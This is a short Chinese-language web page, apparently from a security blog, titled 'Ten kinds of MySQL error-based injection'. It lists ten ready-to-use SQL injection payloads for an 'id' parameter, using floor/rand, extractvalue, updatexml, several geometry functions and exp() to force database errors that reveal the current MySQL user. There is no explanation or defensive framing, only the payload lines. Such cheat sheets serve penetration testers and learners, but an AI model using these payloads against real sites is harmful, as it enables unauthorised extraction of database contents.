---
layout: default
---
# ![](../img/hj.jpg)十种MySQL报错注入

## ![](../img/github14.png)floor()
```sql
id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x) a)
```
## ![](../img/github15.png)extractvalue()
```sql
id = 1 and (extractvalue(1,concat(0x5c,(select user()))))
```
## ![](../img/github16.png)updatexml()
```sql
id = 1 and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))
```
## ![](../img/github17.png)GeometryCollection()
```sql
id = 1 and GeometryCollection((select * from (select * from(select user())a)b))
```
## ![](../img/github18.png)polygon()
```sql
id = 1 and polygon((select * from(select * from(select user())a)b))
```
## ![](../img/github19.png)multipoint()
```sql
id = 1 and multipoint((select * from(select * from(select user())a)b))
```
## ![](../img/github20.png)multilinestring()
```sql
id = 1 and multilinestring((select * from(select* from(select user())a)b))
```
## ![](../img/github21.png)multipolygon()
```sql
id = 1 and multipolygon((select * from(select * from(select user())a)b))
```
## ![](../img/github22.png)linestring()
```sql
id = 1 and linestring((select * from(select * from(select user())a)b))
```
## ![](../img/github23.png)exp()
```sql
id = 1 and EXP(~(select * from(select user())a))
```


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
